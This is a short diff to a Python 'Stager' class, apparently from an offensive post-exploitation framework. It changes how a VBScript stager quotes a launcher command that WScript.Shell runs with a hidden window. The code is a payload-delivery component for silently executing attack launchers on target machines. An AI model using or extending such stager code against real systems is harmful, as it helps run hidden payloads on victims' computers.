@@ -103,7 +103,7 @@ class Stager:
         else:
             code = "Dim objShell\n"
             code += "Set objShell = WScript.CreateObject(\"WScript.Shell\")\n"
-            code += "command = '"+launcher.replace("'", "\\'")+"'\n"
+            code += "command = \""+launcher.replace("'", "\\'")+"\"\n"
             code += "objShell.Run command,0\n"
             code += "Set objShell = Nothing\n"
 
